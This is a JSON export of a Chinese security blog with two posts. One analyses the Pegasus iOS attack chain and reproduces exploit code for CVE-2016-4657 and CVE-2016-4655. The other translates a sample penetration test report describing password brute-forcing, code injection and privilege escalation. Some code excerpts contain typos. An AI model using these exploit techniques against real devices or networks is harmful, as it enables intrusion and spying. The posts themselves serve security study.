{"meta":{"title":"FINSENTY54","subtitle":"你看那云聚了又散，散了又聚","description":"blog","author":"finsenty54","url":"http://finsenty54.github.io","root":"/"},"pages":[{"title":"","date":"2019-02-27T03:27:47.653Z","updated":"2019-02-27T03:23:58.180Z","comments":true,"path":"googleda09d6ee39745173.html","permalink":"http://finsenty54.github.io/googleda09d6ee39745173.html","excerpt":"","text":"google-site-verification: googleda09d6ee39745173.html"}],"posts":[{"title":"pegasus分析","slug":"pegasus分析","date":"2019-04-16T08:54:59.000Z","updated":"2019-04-26T06:39:12.446Z","comments":true,"path":"2019/04/16/pegasus分析/","link":"","permalink":"http://finsenty54.github.io/2019/04/16/pegasus分析/","excerpt":"","text":"PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。阶段二：越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。阶段三：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。 ##CVE-2016-4657第一阶段用到了WebKit’s JavaScriptCore library 中的漏洞CVE-2016-4657。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。 背景MarkedArgumentBuffer中的slowAppend()函数中存在这个漏洞，并且可以在静态方法definePropertries()中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。 1234567891011121314size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;MarkedArgumentBuffer markBuffer;for(size_t i =0;i&lt;numProperties;i++)&#123; JSValue prop = properties-&gt;get(exec,propertyNames[i]); if(exec-&gt;hadException()) return jsNull(); PropertyDescriptor descriptor; if(!toPropertyDescriptor(exec, prop,descriptor)) return jsNull(); descriptors.append(descriptor);&#125; 如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。 1234567for(size_t i=0;i&lt;numProperties; i++)&#123; Identifier propertyName = propertyNames[i]; if(exec-&gt;propertyName().isPrivateName(properName)) continue; object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],true);&#125; 这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了MarkedArgumentBuffer，临时存储变量值，防止被回收。 首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。 MarkedArgumentBuffer维持一个inline栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。 12345678910111213141516171819202122232425262728293031class MarkedArgumentBuffer &#123; ... private: static const size_t inlineCapacity=8; ... public: ... MarkedArgumentBuffer() :m_size(0) ,m_capacity(inlineCapacity) ,m_buffer(m_inlineBuffer) ,m_markSet(0) &#123; &#125; ... void append(JSValue v)&#123; if(m_size &gt;= m_capacity) return slowAppend(v); slotFor(m_size)=JSValue::encode(v); ++m_size; &#125; ... private: ... int m_size; int m_capacity; EncodedJSValue m_inlineBuffer[inlineCapacity]; EncodeedJSValue* m_buffer; ListSet* m_markSet;&#125; inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。123456789101112void MarkedArgumentBuffer::slowAppend(JSValue v)&#123; int newCapacity = m_capacity*4; EncodedJSValue* newBuffer = new EncodeedJSValue[newCapacity]; for(int i=0;i&lt;m_capacity;++i) newBuffer[i]=m_buffer[i]; if (EncodedJSValue* base=mallocBase()) delete [] base; m_buffer=newBuffer; m_capacity=newCapacity;&#125; 一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的m_markListSet并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动markListSet中。1234567891011121314//As long as our size stays within our Vetor's inline//capacity, all our values are allocated on the stack, and //therefore don't need explicit marking. Once our size exceeds //our Vector's inline capacity, though, our values move to the //heap, where they do need explicit marking.for (int i=0; i&lt;m_size;++i)&#123; Heap* heap=Heap::heap(JSValue::decode(slotFor(i))); if(!heap) continue; m_markSet = &amp;heap-&gt;markListSet(); m_markSet-&gt;add(this); break;&#125; 上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。12345inline Heap* Heap::heap(const JSValue v)&#123; if(!v.isCell()) return 0; return heap(v.asCell());&#125; JSValue有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。JSValue::isCell() 函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。123inline bool JSValue::isCell() const&#123; return !(u.asInt64&amp;TagMask);&#125; 因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。 攻击Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。 设置触发漏洞攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。123456789101112131415161718192021222324var arr=new Array(2047);var not_number=&#123;&#125;;not_number.toString=function()&#123; arr=null; props[\"stale\"]['value']=null; ...//Trigger garbage collection and reallocation over stale object return 10;&#125;;var props=&#123; p0:&#123;value:0&#125;, p1:&#123;value:1&#125;, p2:&#123;value:2&#125;, p3:&#123;value:3&#125;, p4:&#123;value:4&#125;, p5:&#123;value:5&#125;, p6:&#123;value:6&#125;, p7:&#123;value:7&#125;, p8:&#123;value:8&#125;, length:&#123;value:not_number&#125;, stale:&#123;value:arr&#125;, after:&#123;value:666&#125;&#125;;var target=[];Object.defineProperties(target,props); 经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。 当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。123456789101112131415var attempts=new Array(4250000);var pressure=new Array(100);...not_number.toString=function()&#123; ... for(var i=0;i&lt;pressure.length;i++)&#123; pressure[i]=new Unit32Array(262144); &#125; var buffer=new ArrayBuffer(80); var unitArray=new Unit32Array(buffer); unitArray[0]=0xAABBCCDD; for(i =0;i&lt;attempts.length;i++)&#123; attempts[i]=new Unit32Array(buffer); &#125;&#125; attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。 完成后，会检测垃圾回收是否触发。1234567var before_len=arr.length;Object.defineProperties(target,props);stale=targets.stale;var after_len=stale.length;if(before_len==after_len)&#123; throw new RecoverableException(8);&#125; 如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。 获取任意读写原语假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。 攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。123456789for(x=attempts.length-1;x&gt;=1;x--)&#123; if(attempts[x].length != 80/4)&#123; if(attempts[x].length==0xFFFFFFFF)&#123; memory_view=attempts[x]; ... break; &#125; &#125;&#125; 获取对象地址完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。 本地代码执行Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。12345678var body=' 'for (var k=0;k&lt;0x600;k++)&#123; body+='try &#123;&#125; catch(e);';&#125;var to_overwrite=new Function('a',body);for(var i=0;i&lt;0x1000;i++)&#123; to_overwrite();&#125; 可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。 回避检测当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。1234window._proto_._proto_=null;x=new String(\"a\");x._proto_._proto_._proto_=window;x.Audio; ##绕过KASLR ###注入的第二阶段：内核位置泄露 第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。 分析KASLR绕过阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。 首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。 32位和63位二进制包不同的地方32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。 加载API想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过dlsym动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在main函数上，加载了大量的API地址，但只使用一小部分的API（例如，socket函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。 分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用chmod改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。 由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在： fs.c 加载跟文件还有文件系统操作方法例如ftw,open,read,rename,mount有关的API kaslr.c 加载API，如IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService，通过利用io _ service _ open _ extended函数中的漏洞，这些API来找到内核地址。 bh.c 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 BZ2 _ bzDecompress, chmod, and malloc safari.c 加载如sync, exit, strcpyAPI，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。 上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。 环境设置和平台确定在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。 为了确定受害者设备的型号，调用了sysctlbyname获得hw.machine。另一个对sysctlbyname获取kern.osversion 信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。 阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–$HOME/tmp/lock（注意：$HOME是一个程序独有变量） 32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。 攻入KASLR阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用CVE-2016-4655找到内核空间中的一个内存地址。 阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫AppleKeyStore的服务并调用IOServiceMatching，调用结果返回到IOServiceGetMatchingService ，得到io _ service _ t对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用io_service_open_extended并将一段精心制作的属性字段传到服务中。这个字段是XML数据的串行化二进制表示，io_service_open_extended会将数据最终传到内核中的OSUnserializeBinary函数。OSUnserializeBinary里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。kOSSerializeNumber类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。1234567891011len=(key &amp; kOSSerializeDataMask);...case kOSSerializeNumber: bufferPos += sizeof(long long); if(bufferPos&gt;bufferSize) break; value=next[1]; value&lt;&lt;=32; value |= next[0]; o = OSNumber::withNumber(value. len); next+=2; break; 问题是len变量在传送到OSNumber::withNumber前是无效的。最终，OSNumber::init被调用，其会盲目信任用户控制的值。12345678bool OSNumber::init(unsigned long long inValue, unsigned int newNumberofBits )&#123; if (!super::init()) return false; size=newNumberOfBits; value=(inValue &amp; sizeMask); return true;&#125; 这个漏洞让阶段二可以控制OSNumber的大小。io_service_open_extended为OSUnserializedBinary准备好了使用环境，通过OSUnserializedBinary来利用漏洞。在怎么利用前，先来看看传送到io_service_open_extended的恶意properties 字段。123456789101112131415161718192021222324252627282930unsigned char properties[]=&#123; //kOSSerializeBinarySignature 0xD3, 0x00,0x00,0x00, //kOSSerializeEndCollecton | kOSSerializeDictionary | 2 0x02,0x00,0x00,0x81, //KEY 1 specified as 30 bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingSrc\", 0x00, //(30 bytes) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 1 //kOSSerializeNumber specified as 0x800 bits (256 bytes) 0x00,0x08,0x00,0x04, //value of OSNumber(4) 0x04,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, //KEY 2 specified as bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingDst\",0x00, //(30 chars) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 2 //kOSSerializeEndCollecton | kOSSerializeNumber | 32 0x20,0x00,0x00,0x84, //value of OSNumber(0x193) 0x93,0x01,0x00,0x00, 0x00,0x00,0x00,0x00&#125;; 阶段二调用IORegistryEntryGetProperty 来找到HIDKeyboardModifierMappingSrc的入口点，导致properties数组创建了超过最大值64bit的OSNumber值。阶段二用下列代码调用is_ io_registry_entry_get_property_bytes，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着IORegistryEntryGetProperty这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：1234567891011do&#123; ...&#125;while (IORegistryEntryGetProperty_0(v13, \"HIDKeyboardModifierMappingSrc\",dataBuffer,&amp;size));writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",127);if(size&gt;8)&#123; writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",138); return dataBuffer[index]&amp;0xFFF00000;&#125; 需要特别注意这段代码的两个方面。第一，properties数组指定OSNumber的值是256字节大小，这个值会最终导致数据泄露。第二，index值会因型号和iOS版本不同而不同，这个值存储在dataBuffer中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定dataBuffer那个地址值是有效的内核地址。 如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。 在受害设备上建立读/写/执行原语（32bit）找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过host_get_clock_service得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。 紧跟着pipe和host_get_clock_service calls，32包检查向前通过task_from_pid创建的内核端口值。如果task_from_pid返回了一个有效值（不是NULL），32包用vm_write写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了clock_ops的一部分。 当调用例如clock_get_attributes函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的getattr操作语。特别的是，实时时钟的getattr被修改成指向OSSerializer::serialize的指针，电池时钟的getattr改成指向_bufattr_cpx的指针。 当两个时钟调用clock_get_attributes时，会改变其原有的执行结果。例如电池时钟调用clock_get_attributes时，相当与调用了内核空间读函数。_bufattr_cpx只有两个属性：123_bufattr_cpx: LDR R0,[R0] BX LR R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然getattr使用了三个参数，但缺少完全兼容的函数原型没有关系。 替代了实时时钟getattr的函数更加复杂。OSSerializer::serialize函数将OSSerializer 对象（包含虚函数表（vtable））作为this指针。函数调用 OSSerializer 对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。1234567_DWORD OSSerializer::serialize(OSSerialize *): LDR R3,[R0,#8] MOV R2,R1 LDR R1,[R0,#0xC] LDR.W R12,[R0,#0x10] MOV R0,R3 BX R12 通过一段特殊设计的数据块，接下来会详细谈到，现在调用clock_get_attributes就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。 如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。 64位包不会利用已越狱手机上的后门。","categories":[],"tags":[{"name":"ios","slug":"ios","permalink":"http://finsenty54.github.io/tags/ios/"}]},{"title":"penetration test report interpretation","slug":"penetration-test-report-interpretation","date":"2019-03-28T16:45:25.000Z","updated":"2019-03-28T08:52:57.792Z","comments":true,"path":"2019/03/29/penetration-test-report-interpretation/","link":"","permalink":"http://finsenty54.github.io/2019/03/29/penetration-test-report-interpretation/","excerpt":"","text":"老师布置的一项任务，deploy丰富博客 渗透测试报告目录执行总结 3结论总结 3攻击记叙 3远程系统调查 3管理员网络服务器界面攻击 5命令解析器到管理服务器 7提权 9JAVA客户机攻击 9升级为本地管理员 11深包检测规避 12Citrix环境下的漏洞 14升级为域管理员 17总论 19建议 20风险等级 20附录A：漏洞细节及减轻危害 21风险等级范围 21默认的或弱的凭证 21密码重用 21共享本地管理员密码 21补丁管理 21DNS区域传送 22默认APACHE文件目录 22附录B:关于Offensive Security 22 执行总结为了检测经过一次蓄意攻击中后会出现什么问题，MegaCory One授权Offensive Security进行了这一次的渗透测试。我们有一个准则，就是为了模拟一个蓄意的攻击者，这个攻击者热衷于攻击MegaCory One的系统，并且我们要达到下列目的：  确认远程攻击者能否破坏MegaCory One的防御系统 确认攻击所带来的影响: 公司重要数据是否泄露 MegaCory One信息系统内部结构是否泄露以及是否可用 我们的工作主要是在确认和利用系统漏洞上，远程攻击者可以通过这些漏洞以未授权的方式获得一些重要数据。这些攻击方式可能一个只会上网的人也可以用。评估是按照NIST SP 800-115 中的标准下进行的，并且所有的测试都是可控的。 结论总结对于MegaCorp One公司系统的第一次检测，就发现了一个错误配置的DNS服务器，其允许进行区域传送。这个漏洞给检测提供了许多可供攻击的主机。检查了这些主机后，发现一个受密码保护的网站服务器界面。我们通过穷举攻击爆出了密码从而能够进入网站，在建了符合网站密码的格式的随机字母表后。 这个管理界面非常脆弱，因为有一个远程代码注入漏洞，通过这个漏洞可以获得对底层操作系统访问的权限。因为没有正确的系统更新，而使最初的小问题变成了大问题。进一步检查后，发现管理用户可以在这个受损的服务器上运行着一个JAVA程序。当我们上传了恶意代码后，取得了访问权限。 利用这个服务器爆出的密码，我们能够访问先前不能访问的资源。这使得我们能够使用本地账户就可以登录许多的WINDOWS主机，一个CITRIX的服务器，还有对于WINDOWS活动目录完整的权限。通过将恶意流量封装进协议里，现有的恶意流量控制就可以避开。 攻击记叙远程系统调查为了更好的评估，MegaCorp One提供了很少的信息，除了组织的域名:megacorpone.com。这样做的目的是为了更符合一个没有得到内部信息的攻击者。为了避免攻击其他组织的系统，在攻击前，所有系统都进行了所有权验证。 我们检查了megacorpone.com域名的DNS服务器，查看有没有可能的攻击目标。 Figure 1-通过收集域名的信息找到了三个DNS服务器 利用这几个服务器，我们试着去进行区域传输。发现ns2.megacorpone.com的区域传输配置错误。这暴露了许多的主机名和其相关的IP地址，这非常有帮助。（Figure 2）区域传输提供给攻击者详细的信息，这个组织的职能，网段。详细请看附录A。 Figure 2-一个错误配置的DNS服务器，允许完整的五限制的区域传输 这些识别出的主机提交给了MegaCorp One确认，确定整个50.7.67.X网段都要在评估范围内。这些主机会被扫描，接着列举出所有正在运行的服务。为了确定这些服务器潜在的漏洞，它们会被仔细的检查。 通过枚举技术和网络扫描，可以建立一个映射MegaCorp One网络的结构。 在Figure 3中展示了目标网络结构。例如深包检查这样的额外控制细节，会在接下来的评估中提到，这里为完整性，先说一点。 Figure 3-目标网络 管理员网络服务器界面攻击Admin.megacorpone.com服务器在81端口上运行着Apache服务。通过站点的根URL访问，发现了一个空白页面。接下来，进行一次快速的枚举扫描，以期找到公用目录和文件。（Figure 4） Figure 4-admin.megacorpone.com的枚举攻击揭露了网站的文件结构 扫面的结果显示没有改变Apache公共默认目录(详细请看附录A)，我们确定/admin是唯一可通过身份验证的目录。（Figure 5） Figure 5-admin目录受密码保护 我们定作了一个基于该网站内容的字典文件，为了暴力破解密码。最初的字典包括了331个特意字符串，通过几轮置换，形成了有16201个字符串的字典文件。用admin的用户名和这个字典来暴力破解。 Figure 6-使用字典攻击来获得管理员密码 暴力攻击找到了admin用户的密码”nanotechnology1”。利用这个账户就能一未授权的方式得到网站受保护部分的内容。（Figure 6）详细请看附录A，怎么利用这个漏洞。 这里面有一个SQLite Manager服务界面，无需任何凭证就可以访问。利用这个界面，发现支持phpSQLiteCMS实例的数据库。http://phpsqlitecms.net/ Figure 7-网站运行着SQLite数据库 通过这个界面就可以获得数据，比如用户名，以及相关的密码哈希值。（Figure 8） Figure 8-缺少额外的设置，攻击者可以很方便地获得数据，从”userdata”这个数据库 表中的密码hash值不符合任何标准的格式。使用一个叫”phpselitecms”的软件，查看源代码以确定hash值是怎么产生的。可以看到这个函数的功能是hash账户的密码。 Figure 9-查看源码发现密码hash生成算法 知道了密码hash的格式，还有随意生成的十个字符的salt值，可以将这些hash值转变成等价的加了salt的SHA1值，进行暴力攻击。 得到了两个明文密码，尽管不是立马就有用，但可能在组织里其他的系统中可以用到。 命令解析器到管理服务器先前发现的SQLite Manager有一个著名的代码注入漏洞。(https://www.exploit-db.com/exploits/24320)利用这个漏洞可以获得shell，进入网站服务器用户使用的系统。使用一个改良过的公共漏洞利用库，可以得到admin.megacorpone.com服务器上有限的交互权。详细请看附录A. Figure 10-利用一个公开的可用的SQLite漏洞，就能以未授权的方式进入系统 Figure 11-只能取得www-data这个用户的权限 MegaCorp One使用的SQLite Manager的版本和该存在该漏洞的版本有一些不同。尽管使用的版本也同样存在相同的底层问题，但在没有修正的情况下，这个漏洞不能发挥作用。所以我们添加了功能，让它支持HTTP认证，适合于新版本的SQLite Manager。这个新的漏洞随后会发布出去。 在图12中可以看到方案的内容。 Figure 12-网络服务器的攻击方案 提权当得到了底层系统的交互权后，我们继续寻找可以提升权限的方法。随后，找到了一个可以可以利用的提权的漏洞。(http://www.exploit-db.com/exploits/18411/)详细信息请看附录A。 Figure 13-使用一个提权的漏洞，该主机没有打补丁，所以可以用 因为上传了漏洞利用工具，所以让利用该漏洞有一定的可行性。如果没有这些工具，还是由可能成功提权的，尽管这么做工作量会大大增加。 服务器有许多漏洞，可以给攻击者很多机会，如果不补救的话。有了管理员的权限，攻击者可以做很多的事，既可以攻击MegaCorp One自己，也可以攻击它的用户。当然，很大的可能是同时做这两件事情。 JAVA客户机攻击登录管理员账户，分析该系统。找到了网站的一个私有部分，这个部分给一些特殊的工作站运行一个Java小程序。这个有问题的网段后来被发现是MwgaCorp One的管理网段。 Figure 14-Htaccess规则暴露了该网络的一个子网 通过查看log文件和Java小程序的运行方式，发现这个程序给MegaCorp One子网内部用户提供了管理员功能。这对攻击者来说非常有利，因为它提供了进入内网的可能方法，如果没有这个程序，进入内网会很困难。 获得了MegaCorp One的许可后，我们添加了一个可被客户机下载的小程序。攻击的原理是让客户机信任这个程序，允许运行，就可以连接到其他的客户机。这是普通的社会工程攻击的衍生品，所谓社会工程学攻击，就是让受害者主动去运行一个有害的程序。在这个例子中，不用去误导受害者，因为这个程序早已被认为是可信的。 正如所料，可以连接上其他客户机。 Figure 15-利用恶意的java小程序，可以操纵主机 在适当的地方实施该方案，可以得到管理员网络的系统权限，见图16。 Figure 16-Java小程序成功攻击 升级为本地管理员Java小程序的攻击只能提供一般用户的权限。为了能做更多的事，需要逐步提升权限，成为域管理员。首先，要获得本地管理权限。要达成这一目的，先检查系统看看有什么漏洞。 发现一个组策略首选项文件，其允许用户解密本地管理员密码。(http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)详情请看附录A。 Figure 17-利用这个漏洞，可以获得域控制器的Groups.xml文件 Figure 18-在Groups.xml中包含加密的本地管理员密码 Figure 19-使用Microsoft发布的加密密钥，这个加密密码很容易解密 使用这个明文密码，得到客户机的本地管理员权限。 深包检测规避当尝试建立进入受损系统的附加层时，遇到了进攻性出口过滤。这还是第一次碰到，当为Microsoht远程桌面协议建立加密的出口隧道。 Figure 20-初步尝试建立RDP的出隧道被出口过滤系统阻止 